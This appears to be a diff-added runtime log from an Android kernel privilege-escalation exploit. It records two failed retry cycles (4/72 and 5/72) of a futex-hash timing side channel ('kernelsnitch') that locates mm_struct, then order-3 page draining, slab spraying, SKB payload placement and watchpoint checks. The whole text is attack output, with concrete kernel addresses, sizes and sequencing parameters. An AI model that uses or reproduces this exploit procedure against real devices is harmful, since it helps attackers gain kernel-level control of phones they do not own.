+[b24e39de8 23:25:09] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:25:09] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:25:09] [33m[*][t13553] [0mpayload nonce want=36ab2f7f3086978b got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:25:09] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9415819070 len=8 fill=0 pos=7883678008957363548 page=92978c32e60b2b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:09] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9415819070 len=8 fill=0 pos=7883678008957363548 page=92978c32e60b2b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:09] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9415819070 len=8 fill=0 pos=7883678008957363548 page=92978c32e60b2b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:09] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9415819100 len=8 fill=0 pos=7883678008957363548 page=92978c32e60b2ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:09] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9415819100 len=8 fill=0 pos=7883678008957363548 page=92978c32e60b2ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:09] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff9415819100 len=8 fill=0 pos=7883678008957363548 page=92978c32e60b2ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:09] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:25:09] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:25:09] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:25:09] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:25:09] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff9415818000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:25:09] [31m[-][t13553] [0mprepare_kernel_page retry 4/72
+[b24e39de8 23:25:09] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:25:11] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:25:11] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:25:11] [33m[*][t8930] [0mapprox_time=8 thr=80
+[b24e39de8 23:25:12] [33m[*][t8930] [0mstart finding collisisons
+[b24e39de8 23:25:12] [33m[*][t8930] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:25:12] [33m[*][t8930] [0mtarget_time=134 thr=80
+[b24e39de8 23:25:13] [33m[*][t8930] [0m  00000069875616a8 i=213 t=17017/17742/17571
+[b24e39de8 23:25:14] [33m[*][t8930] [0m  0000006987cd5248 i=2121 t=14213/17720/17530
+[b24e39de8 23:25:15] [33m[*][t8930] [0m  000000698815d688 i=3281 t=17603/17707/17730
+[b24e39de8 23:25:15] [33m[*][t8930] [0m  0000006988193838 i=3335 t=14489/17730/17571
+[b24e39de8 23:25:16] [33m[*][t8930] [0m  00000069885a38b8 i=4375 t=17763/17733/17744
+[b24e39de8 23:25:16] [33m[*][t8930] [0mfound 5 collisisons
+[b24e39de8 23:25:16] [33m[*][t8930] [0mpost-pile baseline=24 target=25 count=5
+[b24e39de8 23:25:16] [33m[*][t8930] [0mpost-pile[1] 00000069875616a8 t=25
+[b24e39de8 23:25:16] [33m[*][t8930] [0mpost-pile[2] 0000006987cd5248 t=24
+[b24e39de8 23:25:16] [33m[*][t8930] [0mpost-pile[3] 000000698815d688 t=25
+[b24e39de8 23:25:16] [33m[*][t8930] [0mpost-pile[4] 0000006988193838 t=14
+[b24e39de8 23:25:17] [33m[*][t8930] [0mpost-pile[5] 00000069885a38b8 t=13
+[b24e39de8 23:25:17] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:25:17] [33m[*][t13989] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:25:17] [33m[*][t13990] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:25:17] [33m[*][t13988] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:25:17] [33m[*][t13992] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:25:17] [33m[*][t13994] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:25:17] [33m[*][t13993] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:25:17] [33m[*][t13995] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:25:17] [33m[*][t13991] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:25:17] [33m[*][t13993] [0mfound mm_struct ffffff93c5d0c380
+[b24e39de8 23:25:17] [33m[*][t13993] [0m[  5] scan done coarse=ffffff9400000000 end=ffffff9480000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13990] [0m[  2] scan done coarse=ffffff92c0000000 end=ffffff9340000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13994] [0m[  6] scan done coarse=ffffff9480000000 end=ffffff9500000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13991] [0m[  3] scan done coarse=ffffff9340000000 end=ffffff9380000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13995] [0m[  7] scan done coarse=ffffff9500000000 end=ffffff9540000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13992] [0m[  4] scan done coarse=ffffff93c0000000 end=ffffff9400000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13988] [0m[  0] scan done coarse=ffffff9200000000 end=ffffff9240000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13989] [0m[  1] scan done coarse=ffffff9240000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:25:17] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff93c5d08000 phys_probe=0xffffff91e2bd1d38 delta=8104665800 (7.5GB)
+[b24e39de8 23:25:17] [33m[*][t13553] [0mprepare_skb_payload base=ffffff93c5d08000 delta=0 payload_base=ffffff93c5d08000
+[b24e39de8 23:25:17] [33m[*][t13553] [0mskbdelta wrote pb=ffffff93c5d08000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:25:17] [33m[*][t13553] [0mpayload nonce 67613d230869787 at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:25:17] [33m[*][t13553] [0mdone
+[b24e39de8 23:25:17] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:25:17] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:25:17] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:17] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:17] [33m[*][t13553] [0mfix40 free-arm n=8 est_pfn=2645256 k=[-2,5]
+[b24e39de8 23:25:17] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:25:17] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:25:17] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:25:17] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:25:18] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:25:18] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:25:18] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:25:18] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:25:18] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:25:18] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:18] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:25:18] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:25:18] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:18] [33m[*][t13553] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2645256 k=[-2,5] k_fixed=-1
+[b24e39de8 23:25:18] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:25:18] [33m[*][t13553] [0mfix36 phase1 tp ctrl=529 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:25:18] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:25:19] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:25:19] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:25:19] [33m[*][t13553] [0mfix40 free HIT pfn=2907400 k=1 hits=1
+[b24e39de8 23:25:19] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:25:19] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:25:19] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff93c5d09100 errno=22
+[b24e39de8 23:25:19] [31m[-][t13553] [0mwatchpoint open open addr=ffffff93c5d09070 errno=22
+[b24e39de8 23:25:19] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff93c5d0ff00 errno=22
+[b24e39de8 23:25:20] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:25:20] [33m[*][t14011] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2645256 k=[-2,5] k_fixed=-1
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t14011] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:25:20] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=898
+[b24e39de8 23:25:20] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:25:20] [33m[*][t13553] [0mfix36 phase2 tp ctrl=903 ord3=898 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:25:20] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff93c5d0a238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:25:20] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:25:20] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 38[b24e39de8 23:25:20] [33m[*][t13553] [0m 2f[b24e39de8 23:25:20] [33m[*][t13553] [0m de[b24e39de8 23:25:20] [33m[*][t13553] [0m 6a[b24e39de8 23:25:20] [33m[*][t13553] [0m d3[b24e39de8 23:25:20] [33m[*][t13553] [0m ff[b24e39de8 23:25:20] [33m[*][t13553] [0m ff[b24e39de8 23:25:20] [33m[*][t13553] [0m ff[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m 00[b24e39de8 23:25:20] [33m[*][t13553] [0m
+[b24e39de8 23:25:20] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:25:20] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:25:20] [33m[*][t13553] [0mpayload nonce want=67613d230869787 got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c5d09070 len=8 fill=0 pos=7883678008957363548 page=92978c32965a2b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c5d09070 len=8 fill=0 pos=7883678008957363548 page=92978c32965a2b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:20] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c5d09070 len=8 fill=0 pos=7883678008957363548 page=92978c32965a2b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:20] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c5d09100 len=8 fill=0 pos=7883678008957363548 page=92978c32965a2ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c5d09100 len=8 fill=0 pos=7883678008957363548 page=92978c32965a2ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:25:20] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c5d09100 len=8 fill=0 pos=7883678008957363548 page=92978c32965a2ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:25:20] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:25:20] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:25:20] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:25:20] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:25:20] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff93c5d08000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:25:20] [31m[-][t13553] [0mprepare_kernel_page retry 5/72
+[b24e39de8 23:25:20] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:25:22] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:25:22] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:25:22] [33m[*][t15352] [0mapprox_time=6 thr=60
+[b24e39de8 23:25:23] [33m[*][t15352] [0mstart finding collisisons
+[b24e39de8 23:25:23] [33m[*][t15352] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:25:23] [33m[*][t15352] [0mtarget_time=132 thr=60
+[b24e39de8 23:25:23] [33m[*][t15352] [0m  00000069874c71d8 i=59 t=17744/15550/15914
+[b24e39de8 23:25:24] [33m[*][t15352] [0m  0000006987899068 i=1037 t=14394/17711/17715
+[b24e39de8 23:25:24] [33m[*][t15352] [0m  000000698789e090 i=1042 t=17772/17734/14535
+[b24e39de8 23:25:26] [33m[*][t15352] [0m  0000006988090020 i=3076 t=17590/17730/15412
+[b24e39de8 23:25:26] [33m[*][t15352] [0m  0000006988210c20 i=3460 t=17590/17739/17691
+[b24e39de8 23:25:26] [33m[*][t15352] [0mfound 5 collisisons
+[b24e39de8 23:25:27] [33m[*][t15352] [0mpost-pile baseline=21 target=20 count=5
+[b24e39de8 23:25:27] [33m[*][t15352] [0mpost-pile[1] 00000069874c71d8 t=21
+[b24e39de8 23:25:27] [33m[*][t15352] [0mpost-pile[2] 0000006987899068 t=20
+[b24e39de8 23:25:27] [33m[*][t15352] [0mpost-pile[3] 000000698789e090 t=20
+[b24e39de8 23:25:27] [33m[*][t15352] [0mpost-pile[4] 0000006988090020 t=21
+[b24e39de8 23:25:27] [33m[*][t15352] [0mpost-pile[5] 0000006988210c20 t=20
+[b24e39de8 23:25:27] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:25:27] [33m[*][t19503] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:25:27] [33m[*][t19504] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:25:27] [33m[*][t19502] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:25:27] [33m[*][t19506] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:25:27] [33m[*][t19507] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:25:27] [33m[*][t19509] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:25:27] [33m[*][t19508] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:25:27] [33m[*][t19505] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:25:27] [33m[*][t19507] [0mfound mm_struct ffffff942132c380
+[b24e39de8 23:25:27] [33m[*][t19507] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19503] [0m[  1] scan done coarse=ffffff9280000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19504] [0m[  2] scan done coarse=ffffff9300000000 end=ffffff9340000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19502] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19505] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19506] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19508] [0m[  6] scan done coarse=ffffff94c0000000 end=ffffff9500000000 found=1
+[b24e39de8 23:25:27] [33m[*][t19509] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=1
+[b24e39de8 23:25:27] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff9421328000 phys_probe=0xffffff91e2bd1d38 delta=9637814984 (9.0GB)
+[b24e39de8 23:25:27] [33m[*][t13553] [0mprepare_skb_payload base=ffffff9421328000 delta=0 payload_base=ffffff9421328000
+[b24e39de8 23:25:27] [33m[*][t13553] [0mskbdelta wrote pb=ffffff9421328000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:25:27] [33m[*][t13553] [0mpayload nonce 2619e7aa308697bd at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:25:27] [33m[*][t13553] [0mdone
+[b24e39de8 23:25:27] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:25:27] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:25:27] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:27] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:27] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=3019560 k=[-2,4]
+[b24e39de8 23:25:27] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:25:28] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:25:28] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:25:28] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:25:28] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:25:29] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:25:29] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:25:29] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:25:29] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:25:29] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:29] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:25:29] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:25:29] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:29] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3019560 k=[-2,4] k_fixed=-1
+[b24e39de8 23:25:29] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:25:29] [33m[*][t13553] [0mfix36 phase1 tp ctrl=524 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:25:29] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:25:30] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:25:31] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:25:31] [33m[*][t13553] [0mfix40 free HIT pfn=3281704 k=1 hits=1
+[b24e39de8 23:25:31] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:25:31] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:25:31] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff9421329100 errno=22
+[b24e39de8 23:25:31] [31m[-][t13553] [0mwatchpoint open open addr=ffffff9421329070 errno=22
+[b24e39de8 23:25:31] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff942132ff00 errno=22
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:25:31] [33m[*][t19525] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3019560 k=[-2,4] k_fixed=-1
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t19525] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:25:31] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=897
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:25:31] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:25:31] [33m[*][t13553] [0mfix36 phase2 tp ctrl=902 ord3=897 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff942132a238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:25:31] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 38[b24e39de8 23:25:31] [33m[*][t13553] [0m 2f[b24e39de8 23:25:31] [33m[*][t13553] [0m de[b24e39de8 23:25:31] [33m[*][t13553] [0m 6a[b24e39de8 23:25:31] [33m[*][t13553] [0m d3[b24e39de8 23:25:31] [33m[*][t13553] [0m ff[b24e39de8 23:25:31] [33m[*][t13553] [0m ff[b24e39de8 23:25:31] [33m[*][t13553] [0m ff[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m 00[b24e39de8 23:25:31] [33m[*][t13553] [0m
+[b24e39de8 23:25:31] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:25:31] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
